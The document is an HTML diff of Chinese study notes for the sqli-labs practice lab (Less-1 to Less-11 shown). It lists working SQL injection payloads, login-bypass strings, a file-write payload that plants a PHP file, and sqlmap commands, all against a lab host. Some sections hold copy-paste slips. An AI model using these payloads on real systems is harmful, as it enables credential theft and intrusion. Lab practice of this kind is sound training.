@@ -1,0 +1,798 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>Sqli-labs学习笔记Less_1-20</title>
+</head>
+<body><h1 id='less-1'>Less-1 </h1>
+<p><strong>GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一手工union联合查询注入-1'>方法一：<strong>手工UNION联合查询注入</strong></h3>
+<p>1.判断是否能够注入</p>
+<pre><code>http://daishen.ltd:1112/Less-1/?id=1
+</code></pre>
+<p>2.判断表中存在几个字段</p>
+<pre><code>id=1&#39; order by 3 --+
+</code></pre>
+<p>3.判断字段位置</p>
+<pre><code>id=1&#39; and 1=2 union select 1,2,3 --+
+</code></pre>
+<p>4.爆所有库.</p>
+<pre><code>id=1&#39; and 1=2 union select 1,database(),3 --+   查看当前库
+
+id=1&#39; and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
+</code></pre>
+<p>5.爆指定库的所有表</p>
+<pre><code>id=1&#39; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+或者
+id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+</code></pre>
+<p>6.爆指定表的所有字段</p>
+<pre><code>id=1&#39; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+
+</code></pre>
+<p>7.爆出字段内容</p>
+<pre><code>id=1&#39; and 1=2 union select 1,username,password from users where id=1 --+
+
+id=1&#39; and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<h3 id='方法二手工报错型注入'><strong>方法二：手工报错型注入</strong></h3>
+<p>检测报错型payload</p>
+<pre><code>?id=1&#39; and 1=1--+   //正确
+?id=1&#39; and 1=2--+   //失败
+**注意id=正确值
+</code></pre>
+<p>爆表payload</p>
+<pre><code>http://daishen.ltd:1112//Less-1?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
+</code></pre>
+<p>（字段）payload</p>
+<pre><code>http://daishen.ltd:1112//Less-1?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+
+
+</code></pre>
+<p>爆值payload</p>
+<pre><code>http://daishen.ltd:1112//Less-1?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+
+</code></pre>
+<p>显然没有完全显示</p>
+<pre><code>http://daishen.ltd:1112//Less-1?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;Angelina&#39;)))) --+
+</code></pre>
+<h3 id='方法三使用sqlmap进行自动化攻击'>方法三：使用sqlmap进行自动化攻击</h3>
+<p>扫描URL目标</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot;
+</code></pre>
+<p>查看所有库</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -dbs
+</code></pre>
+<p>查看所有表</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security --tables
+</code></pre>
+<p>查看表字段</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security -T users --columns
+</code></pre>
+<p>查看表字段内容</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security -T users --columns -C &quot;username,password&quot; -dump
+</code></pre>
+<p>进入sql-shell</p>
+<pre><code> sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --sql-shell
+</code></pre>
+<p>随机agent</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --random-agent
+</code></pre>
+<p>多线程</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --threads=4
+</code></pre>
+<p>导出HTTP详细请求</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -t http.log
+</code></pre>
+<h1 id='less-2'>Less-2 </h1>
+<p><strong>GET - Error based - Intiger based (基于错误的GET整型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一手工union联合查询注入-2'>方法一：<strong>手工UNION联合查询注入</strong></h3>
+<p>1.判断是否能够注入</p>
+<pre><code>http://daishen.ltd:1112/Less-2/?id=1
+</code></pre>
+<p>2.判断表中存在几个字段</p>
+<pre><code>id=1 order by 3 --+
+</code></pre>
+<p>3.判断字段位置</p>
+<pre><code>id=1 and 1=2 union select 1,2,3 --+
+</code></pre>
+<p>4.爆所有库.</p>
+<pre><code>id=1 and 1=2 union select 1,database(),3 --+   查看当前库
+
+id=1 and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
+</code></pre>
+<p>5.爆指定库的所有表</p>
+<pre><code>id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+或者
+id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+</code></pre>
+<p>6.爆指定表的所有字段</p>
+<pre><code>id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+
+</code></pre>
+<p>7.爆出字段内容</p>
+<pre><code>id=1 and 1=2 union select 1,username,password from users where id=1 --+
+
+id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<p>## </p>
+<h1 id='less-3'><strong>Less-3 </strong></h1>
+<p><strong>GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一手工union联合查询注入-3'>方法一：<strong>手工UNION联合查询注入</strong></h3>
+<p>1.判断是否能够注入</p>
+<pre><code>http://daishen.ltd:1112/Less-3/?id=1
+</code></pre>
+<p>2.判断表中存在几个字段</p>
+<pre><code>id=1&#39;) order by 3 --+
+</code></pre>
+<p>3.判断字段位置</p>
+<pre><code>id=1&#39;) and 1=2 union select 1,2,3 --+
+</code></pre>
+<p>4.爆所有库.</p>
+<pre><code>id=1&#39;) and 1=2 union select 1,database(),3 --+   查看当前库
+
+id=1&#39;) and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
+</code></pre>
+<p>5.爆指定库的所有表</p>
+<pre><code>id=1&#39;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+或者
+id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+</code></pre>
+<p>6.爆指定表的所有字段</p>
+<pre><code>id=1&#39;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+
+</code></pre>
+<p>7.爆出字段内容</p>
+<pre><code>id=1&#39;) and 1=2 union select 1,username,password from users where id=1 --+
+
+id=1&#39;) and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<h1 id='less-4'><strong>Less-4 </strong></h1>
+<p><strong>GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一手工union联合查询注入-4'>方法一：<strong>手工UNION联合查询注入</strong></h3>
+<p>1.判断是否能够注入</p>
+<pre><code>http://daishen.ltd:1112/Less-4/?id=1
+</code></pre>
+<p>2.判断表中存在几个字段</p>
+<pre><code>id=1&quot;) order by 3 --+
+</code></pre>
+<p>3.判断字段位置</p>
+<pre><code>id=1&quot;) and 1=2 union select 1,2,3 --+
+</code></pre>
+<p>4.爆所有库.</p>
+<pre><code>id=1&quot;) and 1=2 union select 1,database(),3 --+   查看当前库
+
+id=1&quot;) and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
+</code></pre>
+<p>5.爆指定库的所有表</p>
+<pre><code>id=1&quot;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+或者
+id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+</code></pre>
+<p>6.爆指定表的所有字段</p>
+<pre><code>id=1&quot;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+
+</code></pre>
+<p>7.爆出字段内容</p>
+<pre><code>id=1&quot;) and 1=2 union select 1,username,password from users where id=1 --+
+
+id=1&quot;) and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<h1 id='less-5'><strong>Less-5 </strong></h1>
+<p><strong>GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一时间延迟型手工注入-1'><strong>方法一：时间延迟型手工注入</strong></h3>
+<p>时间延迟型手工注入，正确会延迟，错误没有延迟。</p>
+<p>判断表中存在几个字段</p>
+<pre><code>id=1&#39; order by 3 --+
+</code></pre>
+<p>验证时间延迟型的盲注：</p>
+<pre><code>http://daishen.ltd:1112/sqli-labs-master/Less-5/?id=1&#39; and sleep(5)--+
+</code></pre>
+<p>发现明显延迟，</p>
+<p>爆库长payload经过几次尝试，发现数据库长度为8时有明显延迟5秒。</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and if(length(database())=8,sleep(5),1) --+
+</code></pre>
+<p>爆库名payload数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)=&#39;security&#39;</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1) --+		第一个字母为s
+
+http://daishen.ltd:1112/Less-5/?id=1&#39; and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+	第二个字母为e
+</code></pre>
+<p>爆表名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; ,sleep(5),1)--+
+
+直接猜
+?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;,sleep(5),5)--+
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+
+</code></pre>
+<p>暴数据payload按照id排序，这样便于对应。注意limit 从0开始.坚持不懈的尝试</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+
+
+http://daishen.ltd:1112/Less-5/?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+
+</code></pre>
+<p>需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<h3 id='方法二布尔型手工注入-1'><strong>方法二，布尔型手工注入</strong></h3>
+<p>在布尔型注入中，<strong>正确会回显，错误没有回显</strong>，以此为依据逐字爆破，</p>
+<p>暴库payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select database()),2)=&#39;se&#39; --+
+</code></pre>
+<p>爆表paylaod</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)=&#39;u&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)=&#39;us&#39; --+
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;i&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2)=&#39;id&#39; --+
+</code></pre>
+<p>爆字段payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&#39; and left((select username from users limit 0,1),1)=&#39;d&#39; --+
+</code></pre>
+<p>需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<h3 id='方法三报错注入-1'>方法三：报错注入</h3>
+<p>爆库</p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x23,database(),0x23))--+
+</code></pre>
+<p> 爆表名</p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+
+
+?id=1&#39; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x23))--+
+</code></pre>
+<p>爆列名</p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),0x23))--+
+</code></pre>
+<p>爆数据</p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+
+
+?id=1&#39; and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))--+
+</code></pre>
+<p>用limit 可以看所有的数据了。</p>
+<p>双注入查询需要理解四个函数/语句</p>
+<ol start='' >
+<li>Rand() //随机函数</li>
+<li>Floor() //取整函数</li>
+<li>Count() //汇总函数</li>
+<li>Group by clause //分组语句</li>
+
+</ol>
+<h1 id='less-6'><strong>Less-6</strong> </h1>
+<p><strong>GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一时间延迟型手工注入-2'><strong>方法一：时间延迟型手工注入</strong></h3>
+<p>时间延迟型手工注入，正确会延迟，错误没有延迟。</p>
+<p>判断表中存在几个字段</p>
+<pre><code>id=1&quot; order by 3 --+
+</code></pre>
+<p>验证时间延迟型的盲注：</p>
+<pre><code>http://daishen.ltd:1112/sqli-labs-master/Less-5/?id=1&quot; and sleep(5)--+
+</code></pre>
+<p>发现明显延迟，</p>
+<p>爆库长payload经过几次尝试，发现数据库长度为8时有明显延迟5秒。</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and if(length(database())=8,sleep(5),1) --+
+</code></pre>
+<p>爆库名payload数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)=&#39;security&#39;</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and if(left(database(),1)=&#39;s&#39;,sleep(5),1) --+		第一个字母为s
+
+http://daishen.ltd:1112/Less-5/?id=1&quot; and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+	第二个字母为e
+</code></pre>
+<p>爆表名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; ,sleep(5),1)--+
+
+直接猜
+?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;,sleep(5),5)--+
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+
+</code></pre>
+<p>暴数据payload按照id排序，这样便于对应。注意limit 从0开始.坚持不懈的尝试</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+
+
+http://daishen.ltd:1112/Less-5/?id=1&quot; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+
+</code></pre>
+<p>需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<h3 id='方法二布尔型手工注入-2'><strong>方法二，布尔型手工注入</strong></h3>
+<p>在布尔型注入中，<strong>正确会回显，错误没有回显</strong>，以此为依据逐字爆破，</p>
+<p>暴库payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select database()),1)=&#39;s&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select database()),2)=&#39;se&#39; --+
+</code></pre>
+<p>爆表paylaod</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)=&#39;u&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)=&#39;us&#39; --+
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;i&#39; --+
+
+http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2)=&#39;id&#39; --+
+</code></pre>
+<p>爆字段payload</p>
+<pre><code>http://daishen.ltd:1112/Less-5/?id=1&quot; and left((select username from users limit 0,1),1)=&#39;d&#39; --+
+</code></pre>
+<p>需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<h3 id='方法三报错注入-2'>方法三：报错注入</h3>
+<p>爆库</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x23,database(),0x23))--+
+</code></pre>
+<p> 爆表名</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+
+
+?id=1&quot; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x23))--+
+</code></pre>
+<p>爆列名</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),0x23))--+
+</code></pre>
+<p>爆数据</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+
+
+?id=1&quot; and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))--+
+</code></pre>
+<h1 id='less-7'><strong>Less-7</strong> </h1>
+<p><strong>GET - Dump into outfile - String （导出文件GET字符型注入）</strong></p>
+<p>&nbsp;</p>
+<p>小扩展：</p>
+<pre><code>winserver的iis默认路径c:\Inetpub\wwwroot
+
+linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/html等
+
+apache 就.../var/www/html，.../var/www/html/htdocs
+
+phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\
+
+xammp 就是...\xampp\htdocs
+
+load_file()导出文件
+
+Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。
+</code></pre>
+<p>使用条件：</p>
+<pre><code>A、必须有权限读取并且文件必须完全可读
+and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。
+and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权
+
+B、欲读取文件必须在服务器上
+
+C、必须指定文件完整的路径
+
+D、欲读取文件必须小于max_allowed_packet
+</code></pre>
+<p>在less-2直接注入拿到路径</p>
+<pre><code>http://daishen.ltd:1112/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+
+</code></pre>
+<p>注入less-7</p>
+<p>Payload</p>
+<pre><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php phpinfo() ?&gt;&#39; into outfile &quot;/usr/share/nginx/a.php&quot;--+        写入木马
+</code></pre>
+<pre><code>?id=1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;/var/www/html/users.txt&quot;--+		导出数据
+</code></pre>
+<h1 id='less-8'><strong>Less-8</strong> </h1>
+<p><strong>GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</strong></p>
+<p>&nbsp;</p>
+<p>判断报错</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and 1=1 --+
+
+http://daishen.ltd:1112/Less-8/?id=1&#39; and 1=2 --+
+</code></pre>
+<p>判断数据版本</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and left(version(),3)=5.5 --+
+</code></pre>
+<p>猜解库的长度</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and length(database())=8 --+
+</code></pre>
+<p>猜解库名</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+
+
+http://daishen.ltd:1112/Less-8/?id=1&#39; and left((select database()),8)=&#39;security&#39; --+
+</code></pre>
+<p>猜解表名</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; --+
+</code></pre>
+<p>猜解字段名</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;i&#39; --+
+</code></pre>
+<p>猜解记录</p>
+<pre><code>http://daishen.ltd:1112/Less-8/?id=1&#39; and left((select username from users limit 0,1),1)=&#39;d&#39; --+
+</code></pre>
+<h1 id='less-9'><strong>Less-9</strong> </h1>
+<p><strong>GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</strong></p>
+<p>&nbsp;</p>
+<p>判断延时</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and sleep(3) --+
+</code></pre>
+<p>猜解库的长度</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and if(length(database())=8,sleep(3),1) --+
+</code></pre>
+<p>猜解库名</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and if(left((select database()),1)=&#39;s&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解表名</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解字段名</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;i&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解记录</p>
+<pre><code>http://daishen.ltd:1112/Less-9/?id=1&#39; and if(left((select username from users limit 0,1),1)=&#39;d&#39;,sleep(3),1) --+
+</code></pre>
+<h1 id='less-10'><strong>Less-10</strong> </h1>
+<p><strong>GET - Blind - Time based - double quotes (基于时间的双引号盲注)</strong></p>
+<p>&nbsp;</p>
+<p>判断延时</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1” and sleep(3) --+
+</code></pre>
+<p>猜解库的长度</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1” and if(length(database())=8,sleep(3),1) --+
+</code></pre>
+<p>猜解库名</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1” and if(left((select database()),1)=&#39;s&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解表名</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解字段名</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;i&#39;,sleep(3),1) --+
+</code></pre>
+<p>猜解记录</p>
+<pre><code>http://daishen.ltd:1112/Less-10/?id=1&quot; and if(left((select username from users limit 0,1),1)=&#39;d&#39;,sleep(3),1) --+
+</code></pre>
+<h1 id='less-11'><strong>Less-11</strong> </h1>
+<p><strong>POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='万能密码-1'>万能密码</h3>
+<p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p>
+<pre><code class='language-shell' lang='shell'>mysql&gt; select * from users where username = &#39;admin&#39;;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  8 | admin    | admin    |
++----+----------+----------+
+</code></pre>
+<p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p>
+<pre><code class='language-shell' lang='shell'># 注释掉 passwd 来登录
+uname=admin&#39;--+&amp;passwd=&amp;submit=Submit
+uname=admin&#39;#&amp;passwd=&amp;submit=Submit
+
+# 注释后面语句 并 添加一个永真条件
+uname=admin&amp;passwd=1&#39; or 1--+&amp;submit=Submit
+uname=admin&amp;passwd=1&#39;||1--+&amp;submit=Submit
+uname=admin&amp;passwd=1&#39; or 1#&amp;submit=Submit
+uname=admin&amp;passwd=1&#39;||1#&amp;submit=Submit
+
+# 闭合后面语句 并 添加一个永真条件
+uname=admin&amp;passwd=1&#39;or&#39;1&#39;=&#39;1&amp;submit=Submit
+uname=admin&amp;passwd=1&#39;||&#39;1&#39;=&#39;1&amp;submit=Submit
+</code></pre>
+<p>因为这是一个 POST 型的注入，那么国光这里就再啰嗦一遍，走一遍详细的流程吧</p>
+<h3 id='联合查询注入-1'>联合查询注入</h3>
+<blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p>
+</blockquote>
+<pre><code class='language-payload' lang='payload'>uname=admin&amp;passwd=1&#39;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit
+</code></pre>
+<p>暴表payload</p>
+<pre><code>uname=admin&#39; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴字段</p>
+<pre><code>uname=admin&#39; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴内容</p>
+<pre><code>uname=admin&#39; and 1=2 union select 1,group_concat(username,0x3a,password,0x23) from users --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='extractvalue报错注入-1'>extractvalue报错注入</h3>
+<p>爆库payload</p>
+<pre><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆值payload</p>
+<pre><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='sqlmap'>sqlmap</h3>
+<p><strong>加载目标</strong></p>
+<p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p>
+<pre><code class='language-http' lang='http'>POST /Less-11/ HTTP/1.1
+Host: daishen.ltd:1112
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://daishen.ltd:1112/Less-11/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+uname=admin&amp;passwd=2333&amp;submit=Submit
+</code></pre>
+<p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p>
+<pre><code class='language-shell' lang='shell'>sqlmap -r test.txt
+</code></pre>
+<p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p>
+<pre><code class='language-shell' lang='shell'>sqlmap -u &quot;http://daishen.ltd:1112/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot;
+</code></pre>
+<p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来都使用 <code>--data</code> 这个参数来进行注入 </p>
+<p><strong>联合查询注入</strong></p>
+<pre><code class='language-shell' lang='shell'>sqlmap -u &quot;http://daishen.ltd:1112/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot; -p &quot;uname&quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3
+</code></pre>
+<p><strong>报错注入</strong></p>
+<pre><code class='language-shell' lang='shell'>sqlmap -u &quot;http://daishen.ltd:1112/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot; -p &quot;uname&quot; --dbms=MySQL --random-agent --flush-session --technique=B -v 3
+</code></pre>
+<p><strong>布尔盲注</strong></p>
+<pre><code class='language-shell' lang='shell'>sqlmap -u &quot;http://daishen.ltd:1112/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot; -p &quot;uname&quot; --dbms=MySQL --random-agent --flush-session --technique=B -v 3
+</code></pre>
+<p><strong>延时盲注</strong></p>
